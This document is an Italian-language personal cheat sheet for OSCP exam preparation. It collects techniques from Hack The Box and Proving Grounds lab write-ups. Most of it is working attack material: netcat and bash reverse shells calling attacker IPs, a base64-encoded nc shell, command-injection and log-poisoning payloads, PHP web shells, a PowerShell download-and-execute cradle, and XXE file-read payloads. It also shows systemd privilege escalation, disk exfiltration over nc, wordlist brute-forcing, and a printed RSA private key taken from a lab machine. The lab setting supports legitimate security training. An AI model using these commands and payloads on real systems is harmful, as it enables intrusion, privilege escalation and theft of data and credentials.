
**SE DOVESSI AVERE PROBLEMI CON LA SHARED FOLDER, ESEGUI QUESTO COMANDO**
vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000 

E poi trovi la cartella /mmt/hgfs/shared

cp /mnt/hgfs/shared/

#### Articoli da Leggere:
https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html
https://www.exploit-db.com/papers/42556
https://hacktips.it/guida-privilege-escalation-sistemi-windows/
https://hacktips.it/guida-privilege-escalation-sistemi-linux/



https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt

Reverse shell explain:
https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/


Github resources:
https://github.com/ferreirasc/oscp


Privilege Escalation:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

Windows Kernel Exploit:
https://github.com/SecWiki/windows-kernel-exploits/




WinPEAS:
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe


### While
while read -r line; do echo $line; done < test.txt

while read -r ip; do echo $ip; mkdir $ip; nmap -sV -sS -sC -p- -v -oA $ip/nmap_fulltcp $ip; done < targets.txt
while read -r ip; do echo $ip; nmap -sU -sV --top-ports=100 -oA $ip/nmap_udp100 $ip; done < targets.txt

### Nmap
nmap -sV -sS -sC -p- -v -oA 192.168.49.96/nmap_fulltcp 192.168.49.96

sudo nmap --script vuln 192.168.1.87 
sudo nmap -p- -O -sS -sV --reason --open 192.168.1.87 -Pn
sudo nmap 10.10.10.40 --top-ports=10 --reason --open -sV -sT -Pn

sudo nmap -sU -sV --top-ports=100 192.168.128.44


### Windows services/port
https://veerasundar.com/blog/how-to-check-which-application-is-using-which-port

```
C:\Users\IEUser>tasklist | findstr NOME_APPLICAZIONE
NOME_APPLICAZIONE             4376 Console                    1      9.964 K
```
Per la porta in ascolto:
```
C:\Users\IEUser>netstat -aon | findstr 4376
  TCP    0.0.0.0:2233           0.0.0.0:0              LISTENING       7492
```


### IRC
Vedi UT99 di Providing Grounds.
```
HexChat IRC client
```

### SMB crea connessione

```
kali@gateway:/etc/samba$ tail /etc/samba/smb.conf -n 13


 [update]
   path = /home/kali/Documents/192.168.49.84/update
   browseable = yes
   guest ok = Yes
   public = yes
   writable = yes
   available = yes



kali@gateway:/etc/samba$ sudo service smbd restart; sudo service nmbd restart
```

### /usr/bin/bash

```
/usr/bin/bash -p -c “<command>”
```
Se in command si dà "id" e questo dà come user un'altro da quello che si sta usando, allora si può creare una chiave ssh (authorized_key) per poi loggarsi in ssh con quell'utente.


### Cewl
https://0xdf.gitlab.io/2018/07/15/htb-bart.html
```
root@kali:~/hackthebox/bart-10.10.10.81# cewl -w cewl-forum.txt -e -a http://forum.bart.htb
CeWL 5.3 (Heading Upwards) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```


PHP file RCE
```
┌──(kali㉿kali)-[~]
└─$ cat pwn.php 
<?php
$exec = system('shell.exe', $val);
?>
```

### Metodi
Aprire .db file:
```
sqlite3 files.db
```


Se si trova uno script che prende in input qualche parametro e vogliamo eseguire command injection, possiamo eseguire in questo modo:
```
www-data@jarvis:/tmp$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.8 443'
#!/bin/bash

nc -e /bin/bash 10.10.14.8 443
www-data@jarvis:/tmp$
www-data@jarvis:/tmp$ echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.8 443' > /tmp/d.sh
www-data@jarvis:/tmp$ chmod +x /tmp/d.sh
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(/tmp/d.sh)
```
Esempio preso da https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html


### Convertire file python in binario (Windows)
```
pyinstaller.exe --onefile .\41090.py
```


### Nc in base64
```
echo bmMgMTkyLjE2OC4xOS40OSA4MCAtZSAvYmluL2Jhc2g= | base64 -d | /bin/bash
```
Decodificato
```
nc $IP 80 -e /bin/bash
```


### Esecuzione codice in POST
Hetemit di Providing Grounds.
https://n3h4l.github.io/hetemit-pg-writeup

```
POST /verify HTTP/1.1
Host: 192.168.131.117:50000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: _register_hetemit_session=gqUOmpxCTU%2BZ8b3oNACheXFmUuJX5N%2BWP%2BltT7KqntFHRcaBiHIdpYT84HCMXtBbB2tEzSBuSwDNOVOiBgKWAXrpnupVMphsBisMAEmSy6PoJJEBT481LPgBwLRcXYKMAaupFmSAqz51CeXRRO%2BbHdFp6btM4qOphJFtQeLBGysqOGoqnepboD%2FOIvmpYHQyLcugpErPetzeIf4OPasMFDgoBD8SRzh0LEm8R4kmF85f53BQqTaW%2F2ibFktj%2Fop4s2aPRDlJC2vyEH%2ByICuGv95jHPfbOVn2h3ceEuZSph3I--%2F8n08ek6wERCk2TG--iW5SiN97ItbFtShjuIHroQ%3D%3D
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

code={os.popen("id").read()}

-----------------------------------------------------------------------------------------------------------------------------------------

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 59
Server: Werkzeug/1.0.1 Python/3.6.8
Date: Mon, 31 May 2021 18:21:30 GMT

{'uid=1000(cmeeks) gid=1000(cmeeks) groups=1000(cmeeks)\n'}
```

Per reverse shell, si può usare:
```
code={os.popen("nc 192.168.49.231 80 -e /bin/bash").read()}
```

### Privilege Escalation con .service
Hetemit di Providing Grounds:
https://n3h4l.github.io/hetemit-pg-writeup

Siccome si vede:
```
[cmeeks@hetemit ~]$ ls -al /etc/systemd/system
[...]

-rw-rw-r--   1 root cmeeks  302 Nov 13  2020 pythonapp.service

[...]
```
E l'utente ha questi privilegi:
```
[cmeeks@hetemit ~]$ sudo -l
Matching Defaults entries for cmeeks on hetemit:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2
    QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```
E l'utente ha i permessi di modificare il file:
```
/etc/systemd/system/pythonapp.service 
```

Allora si può modificare per eseguire una reverse shell:
```
[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service 
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=bash -i >& /dev/tcp/192.168.49.231/21 0>&1
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
```

poi restarto:
```
[cmeeks@hetemit ~]$ sudo reboot
```
e ho reverse shell come root:
```
(base) ┌──(kali㉿kali)-[~/Documents/ProvingGrounds/Hetemit]
└─$ sudo nc -lnvp 21                                                                                                                             1 ⨯
listening on [any] 21 ...
connect to [192.168.49.231] from (UNKNOWN) [192.168.231.117] 55544
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```


oppure invece di restartare la macchina, si restarta il servizio:
```
chmod 777 pythonapp.service (non proprio necessario teoricamente)
/bin/systemctl enable /etc/systemd/system/pythonapp.service
/bin/systemctl start pythonapp.service
/bin/bash -p
````

### Encrypted file

#### Openssl file
https://0xdf.gitlab.io/2018/11/30/htb-hawk.html

**Bash**
```
root@kali:~/hackthebox/hawk-10.10.10.102# file .drupal.txt.enc
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded
```

Si può usare **openssl** per decriptare:
```
root@kali:~/hackthebox/hawk-10.10.10.102# cat /usr/share/wordlists/rockyou.txt | while read pass; do openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k $pass > devnull 2>&1; if [[ $? -eq 0 ]]; then echo "Password: $pass"; exit; fi; done;
Password: friends

root@kali:~/hackthebox/hawk-10.10.10.102# openssl enc -d -a -AES-256-CBC -in .drupal.txt.enc -k friends
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department
```

**Python**
Oppure **openssl-bruteforce**: (Già in Programs)
```
root@kali:~/hackthebox/hawk-10.10.10.102# python openssl-bruteforce/brute.py /usr/share/wordlists/rockyou.txt  openssl-bruteforce/ciphers.txt .drupal.txt.enc 2> /dev/null
Running pid: 12852      Cipher: AES-128-CBC
Running pid: 13343      Cipher: AES-128-CFB
Running pid: 13351      Cipher: AES-128-CFB1
Running pid: 13359      Cipher: AES-128-CFB8
Running pid: 13367      Cipher: AES-128-CTR
Running pid: 13375      Cipher: AES-128-ECB
Running pid: 13983      Cipher: AES-128-OFB
Running pid: 13991      Cipher: AES-192-CBC
Running pid: 15439      Cipher: AES-192-CFB
Running pid: 15447      Cipher: AES-192-CFB1
Running pid: 15455      Cipher: AES-192-CFB8
Running pid: 15463      Cipher: AES-192-CTR
Running pid: 15471      Cipher: AES-192-ECB
Running pid: 16086      Cipher: AES-192-OFB
Running pid: 16094      Cipher: AES-256-CBC
Password found with algorithm AES-256-CBC: friends
Data:
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

------------------------------------------
Running pid: 16190      Cipher: AES-256-CFB
Running pid: 16198      Cipher: AES-256-CFB1
...[snip]...
```


### XXE
https://0xdf.gitlab.io/2018/10/13/htb-devoops.html

C'è anche uno script python per automatizzare e prendere i file che si vuole tramite XXE. 
Siccome ci dà il path dell'utente, lui prende la sua chiave ssh.

Altro esempio:
```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
        <bugreport>
        <title>test</title>
        <cwe>&file;</cwe>
        <cvss>&file;</cvss>
        <reward>&file;</reward>
        </bugreport>


<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php">] >
        <bugreport>
        <title>test</title>
        <cwe>test</cwe>
        <cvss>test</cvss>
        <reward>&xxe;</reward>
        </bugreport>
```

### Identify git repo
https://0xdf.gitlab.io/2018/10/13/htb-devoops.html
```
roosa@gitter:~$ find / -type d -name '.git' 2>/dev/null
/home/roosa/work/blogfeed/.git
```

### Git revert commit
https://0xdf.gitlab.io/2018/10/13/htb-devoops.html

Dai log si vede che c'è un revert dei commit che parla di una chiave:
```
roosa@gitter:~/work/blogfeed$ git log --name-only --oneline
7ff507d Use Base64 for pickle feed loading
src/feed.py
src/index.html
[...]
dfebfdf Gunicorn startup script
run-gunicorn.sh
33e87c3 reverted accidental commit with proper key
resources/integration/authcredentials.key
d387abf add key for feed integration from tnerprise backend
resources/integration/authcredentials.key
1422e5a Initial commit
README.md
```

Prima si fa il check del valore del commit in cui si è per poi riallineare lo stato:
```
roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
```
Poi:
```
roosa@gitter:~/work/blogfeed$ git checkout d387abf -- resources/integration/authcredentials.key
roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key
roosa@gitter:~/work/blogfeed$ cat resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
-----END RSA PRIVATE KEY-----
```

E trova una chiave privata che userà per loggarsi in ssh come root.
E infine fa il reset dello stato di github:
```
roosa@gitter:~/work/blogfeed$ git reset --hard 7ff507d
HEAD is now at 7ff507d Use Base64 for pickle feed loading
roosa@gitter:~/work/blogfeed$ md5sum resources/integration/authcredentials.key
f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key
```

### Password in Raw Image
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html

### Disk
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html

Nello swap c'erano password in chiaro (tipo /etc/shadow o il flag).
Usa **blkid**:
```
yossi@falafel:/dev/shm/.d$ blkid
/dev/sda1: UUID="ccba94d2-0b82-49ce-b25d-f1d3615345f0" TYPE="ext4" PARTUUID="01590ad6-01"
/dev/sda5: UUID="63f5a640-a3f7-4ea9-9dbd-c9a091ace20c" TYPE="swap" PARTUUID="01590ad6-05"

yossi@falafel:/dev/shm/.d$ swapon -s
Filename                                Type            Size    Used    Priority
/dev/sda5                               partition       1046524 147000  -1

yossi@falafel:/dev/shm/.d$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
# / was on /dev/sda1 during installation
UUID=ccba94d2-0b82-49ce-b25d-f1d3615345f0 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=63f5a640-a3f7-4ea9-9dbd-c9a091ace20c none            swap    sw              0       0

yossi@falafel:/dev/shm/.d$ mount | grep sda
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
```


### Brute force login with length response
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html

Prima prova con quelli sbagliati e poi setta -hh 7074 perchè sa che quella length è per quelli non esistenti:
```
root@kali:~/hackthebox/falafel-10.10.10.73# wfuzz -c -w /opt/SecLists/Usernames/Names/names.txt -d "username=FUZZ&password=abcd" -u http://10.10.10.73/login.php --hh 7074

********************************************************
* Wfuzz 2.2.9 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.73/login.php
Total requests: 10163

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000086:  C=200    102 L      659 W         7091 Ch        "admin"
001883:  C=200    102 L      659 W         7091 Ch        "chris"

Total time: 328.8529
Processed Requests: 10163
Filtered Requests: 10161
Requests/sec.: 30.90438
```


### Public Key
https://ranakhalil101.medium.com/hack-the-box-jail-writeup-w-o-metasploit-c0601ed7b947

Se si trova una chiave pubblica:
```
root@kali:~/Desktop/htb/jail/adm# cat rootauthorizedsshkey.pub 
-----BEGIN PUBLIC KEY-----
MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQYHLL65S3kVbhZ6kJnpf072
YPH4Clvxj/41tzMVp/O3PCRVkDK/CpfBCS5PQV+mAcghLpSzTnFUzs69Ys466M//
DmcIo1pJGKy8LDrwdpsSjVmvSgg39nCoOYMiAUVF0T0c47eUCmBloX/K8QjId6Pd
D/qlaFM8B87MHZlW1fqe6QKBgQVY7NdIxerjKu5eOsRE8HTDAw9BLYUyoYeAe4/w
Wt2/7A1Xgi5ckTFMG5EXhfv67GfCFE3jCpn2sd5e6zqBoKlHwAk52w4jSihdzGAx
I85LArqOGc6QoVPS7jx5h5bK/3Oqm3siimo8O1BJ+mKGy9Owg9oZhBl28CfRyFug
a99GCw==
-----END PUBLIC KEY-----
```

Si può usare **RsaCtfTool.py**: https://github.com/Ganapati/RsaCtfTool
Per crackare la chiave pubblica.
```
./RsaCtfTool.py --publickey /root/Desktop/htb/jail/adm/rootauthorizedsshkey.pub --private > id_root

chmod 400 id_root

root@kali:~/Desktop/htb/jail/adm# ssh -i id_root root@10.10.10.34
```


### brute_monitor_login.py
Script che fa brute force di un login facendo uso del csrf:
https://0xdf.gitlab.io/2018/07/15/htb-bart.html


### Command Injection without ;
https://0xdf.gitlab.io/2020/09/10/htb-haircut.html

Se non dovesse funzionare il **;** perchè viene filtrato, si può usare **$()**:
```
root@kali# curl http://10.10.10.24/exposed.php -d 'formurl=10.10.14.15/$(ping -c 1 10.10.14.15)&submit=go'
```

E quindi fare una reverse shell:
```
root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'

root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(curl 10.10.14.15/shell.sh -o /tmp/0xdf)' --data-urlencode 'submit=go'

root@kali# curl http://10.10.10.24/exposed.php --data-urlencode 'formurl=10.10.14.15/$(/tmp/rev)' --data-urlencode 'submit=go'
```


### Option Injection
https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
If I’m going to have trouble running a different command, could I at least mess with curl by injecting options. If I send 
```
http://10.10.14.15/test.php -b testcookie=testvalue
```
I can watch on nc to see if the cookie is included in the request. It is:
```
root@kali# nc -lknvp 80
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::80
Ncat: Listening on 0.0.0.0:80
Ncat: Connection from 10.10.10.24.
Ncat: Connection from 10.10.10.24:48118.
GET /test.php HTTP/1.1
Host: 10.10.14.15
User-Agent: curl/7.47.0
Accept: */*
Cookie: test=test
```


### Upload Webshell with Curl
https://0xdf.gitlab.io/2020/09/10/htb-haircut.html

I’ll use **-o** to save the file on Haircut. I can save it into the uploads directory and see if it will run as PHP there.
```
http://10.10.14.15/cmd.php -o uploads/0xdf.php
```
(perchè lui immagina che nella web page faccia una curl di quanto gli dà in input)

E poi:
```
root@kali# curl http://10.10.10.24/uploads/0xdf.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

E poi si può creare una reverse shell, utilizzando **--data-urlencode**:
```
root@kali# curl -G http://10.10.10.24/uploads/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.15/443 0>&1'"
```

### Web shell - File name truncation
https://0xdf.gitlab.io/2018/06/23/htb-falafel.html

```
root@kali:~/hackthebox/falafel-10.10.10.73# URL=$(python -c 'print "http://10.10.15.99:8081/" + "A"*232 + ".php.png"'); curl -i -s -k  -X $'POST'     -H $'Referer: http://10.10.10.73/upload.php' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Cookie: PHPSESSID=g9kp8du6ofpc7g8m5d81nt2c00'     --data-binary "url=$URL" $'http://10.10.10.73/upload.php' | grep -e "The name is too long" -e shorten -e "New name" -e CMD
        <pre>CMD: cd /var/www/html/uploads/0515-1930_45ed3e0a6a8c22db; wget 'http://10.10.15.99:8081/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'</pre>
        <pre>The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
```
Test the shell:
```
root@kali:~/hackthebox/falafel-10.10.10.73# curl http://10.10.10.73/uploads/0515-1930_45ed3e0a6a8c22db/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### Useful Commands
**Vedere il tipo di file**
```
oxdf@parrot$ file myplace.backup 
myplace.backup: ASCII text, with very long lines, with no line terminators
```

**Per avere una lista univoca dei caratteri nel file** (magari per capire se è base64)
```
oxdf@parrot$ cat myplace.backup | od -cvAnone -w1 | sort -bu | tr -d '\n' | tr -d ' '
+/=0123456789aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ
```
Così si può eseguire poi:
```
cat myplace.backup | base64 -d > myplace.backup.decode
```
E poi vedere che è uno zip
```
oxdf@parrot$ file myplace.backup.decode
myplace.backup.decode: Zip archive data, at least v1.0 to extract
oxdf@parrot$ mv myplace.backup.decode myplace.backup.zip
```

**Unzip**
```
oxdf@parrot$ unzip -l myplace.backup.zip
```


### Decrypt/Encrypt
https://0xdf.gitlab.io/2018/09/08/htb-poison.html
Se, per esempio, una stringa è cifrata 13 volte, per decifrarla:
```
root@kali:~/hackthebox/poison-10.10.10.84# data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```


### Log Poisoning
https://0xdf.gitlab.io/2018/09/08/htb-poison.html

L'idea è quella di inserire qualche codice php nei log, così da caricare tramite LFI il log ed eseguire il codice.
If we look at the access log, we see that on each visit to the site, there’s an entry written with the url visited and the user-agent string of the browser visiting.

The simplest case would be to change our user-agent string such that it includes php, and then include that log file with our LFI. We could also poison the url field, but visiting something like http://10.10.10.84/browse.php?not_an_arg=[php code]. As long as we can get our php written into the log, we will succeed.

Però prima si deve trovare il file di log. Prima si fa andare in errore cercando una pagina non esistente così ci rivela il path di wwwroot. 
Per esempio:
```
This reveals the path to the current wwwroot as: /usr/local/www/apache24/data/browse.php
```
Poi vogliamo trovare il file httpd.conf e, considerando il path di prima, si può navigare "/usr/local/etc/apache24/httpd.conf". Questo, se esiste, contiene:
```
ErrorLog "/var/log/httpd-error.log"
CustomLog "/var/log/httpd-access.log" combined
```

Poi si manda la richiesta, inserendo il codice php nell'user agent:
```
GET / HTTP/1.1
Host: 10.10.10.84
User-Agent: 0xdf: <?php system($_GET['c']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
E poi si naviga: 
```
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&c=id
```
E questo esegue il comando **id**.

In questo modo si può eseguire una reverse shell.

**Per Windows**
https://0xdf.gitlab.io/2018/07/15/htb-bart.html

```
>>> cmd = "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/Invoke-PowerShellTcp.ps1')"
>>> r = requests.get('http://internal-01.bart.htb/log/0xdf.php?cmd={}'.format(cmd), proxies=proxies)
```


### Privilege Escalation via Disk
Vedi esempio: https://0xdf.gitlab.io/2021/05/19/htb-kotarak.html

**lsblk** shows how the devices are configured:
```
atanas@kotarak-dmz:~$ lsblk
NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda                      8:0    0   12G  0 disk 
├─sda1                   8:1    0  120M  0 part /boot
├─sda2                   8:2    0    1K  0 part 
└─sda5                   8:5    0 11.9G  0 part 
  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
sr0                     11:0    1 1024M  0 rom 
```

Kotarak--vg-root and Kotarak--vg-swap_1 are the root file system and swap space under LVM. Both live on the sda5 partition on sda. The LVM mappings live in /dev/mapper:
```
atanas@kotarak-dmz:~$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 May 14 20:51 control
lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 May 14 20:51 Kotarak--vg-swap_1 -> ../dm-1
```

Avendo i device si vuole esfiltrare, in questo esempio, si vuole esfiltrare dm-0
**Exfil Filesystem**
Si scarica quindi il path come gzip:
```
atanas@kotarak-dmz:~$ time dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.15 443
14680064+0 records in
14680064+0 records out
7516192768 bytes (7.5 GB, 7.0 GiB) copied, 438.725 s, 17.1 MB/s

real    7m18.932s
user    2m4.900s
sys     0m25.648s
```

Si unzippa:
```
oxdf@parrot$ gunzip dm-0.gz 
oxdf@parrot$ ls -lh dm-0 
-rwxrwx--- 1 root vboxsf 7.0G May 15 15:40 dm-0
```
E si monta il file system:
```
oxdf@parrot$ sudo mount dm-0-orig /mnt/
oxdf@parrot$ ls /mnt/
backups  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
```


### Authbind
authbind is a program that allows non-root users to bind on low ports.

With authbind, I’m able to listen on port 80 without issue:
```
atanas@kotarak-dmz:/root$ authbind nc -lnvp 80
Listening on [0.0.0.0] (family 0, port 80)
```

### Exfill via nc
I’ll exfil each over nc. 
```
For example, I’ll start a listener with nc -lnvp 443 > 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit on my VM, and then run cat 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit | nc 10.10.14.15 443 on Kotarak.
```


### TFTP
TFTP usa l'UDP (porta 69) come protocollo di trasporto (a differenza del FTP che usa il TCP sulla porta 21).
Viene usato in https://latesthackingnews.com/2018/09/22/pluck-vulnhub-ctf-challenge-walkthrough/

### RPCDUMP
└─$ python /opt/impacket/examples/rpcdump.py 192.168.128.127

### Impacket
https://www.hackingarticles.in/impacket-guide-smb-msrpc/


